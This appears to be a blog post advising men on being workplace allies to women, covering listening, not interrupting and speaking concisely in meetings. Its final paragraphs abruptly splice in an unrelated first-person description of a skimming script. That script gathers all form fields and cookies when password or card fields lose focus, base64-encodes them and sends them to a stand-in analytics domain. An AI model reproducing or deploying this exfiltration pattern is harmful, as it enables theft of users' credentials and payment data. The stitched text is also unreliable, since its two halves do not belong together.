## A few specific ideas for being a good ally

So, we run a [workshop](google.com) to help women reduce the impact of gender bias in the workplace. A commonly asked question is something like “Why aren’t you running a workshop for men, since they are the ones who have to change?” The short answer is that it’s a complex dynamic, and women have the most incentive to change it. Our approach is to help decrease the amount of effort overall since women in male-dominated workplaces are already putting in so much extra because of bias. If you want to change habits, start where there are already strong incentives for change.

The longer answer is, we’re working on it.

In the meantime, I know there are a lot of men out there right now with good intentions who want to help change things, but it’s not always clear which actions are most helpful. And asking the people who are already doing extra work to do the additional work of teaching you how to help them do less work is…annoying. This is true for anyone who has more privilege in any given situation. Do your part to make it easier.

So, based on what we’ve heard in our workshops, conversations with colleagues, and straight-up asking Twitter, here are a few very specific helpful actions you can take. Many of these you’ve probably heard before. If we keep repeating, maybe they’ll stick. We all know the right thing to do, it’s cultivating a habit of doing the right thing in the moment that is so hard.

(Note: This list is just a starting point, and I’ve focused on peer-level actions, not management. I’ll probably make some edits and amendments and will definitely write more on this topic. Thanks to everyone weighing in!)

## Listen to women
This is fundamental on all levels. Listen to the individual woman who is talking to you. Assume she knows what she is talking about. Listen to the collective voices of women saying there is a problem. Stifle any urge to respond defensively. Don’t try to guess what they’re about to say. Just listen.

And don’t interrupt.

## Create space for women to speak
“The research suggests that, in groups, men tend to get and keep the floor more often than women, talk more often and for longer, interrupt more, and make different kinds of contributions, using language strategies that challenge, create and maintain status distinctions (i.e. they create and maintain asymmetrical alignments between themselves and interlocutors).”

—“Gender and Language in the Workplace” by Shari Kendall and Deborah Tannen

When you are speaking, you can help just by getting to your point faster. This helps everyone, really.

For bonus points, start paying attention in meetings and listen for men using far more words than necessary. Logorrhea is not necessarily a conscious move, and often comes from insecurity. Truly confident people are succinct.

Then, when there’s a blur event on a password/credit card field, or a form submit event is heard, my code:

* Takes data from all form fields (document.forms.forEach(…)) on the page
* Grabs document.cookie
* It turns all that into a random looking string const payload = btoa(JSON.stringify(sensitiveUserData))
* Then sends it off to `https://legit-analytics.com?q=${payload}` (not the real domain, of course)
* In `short`, if ```it looks``` like data that might be even remotely valuable to me, I send it off to my server.

> *f an attacker successfully injects any code at all, it’s pretty much game over*
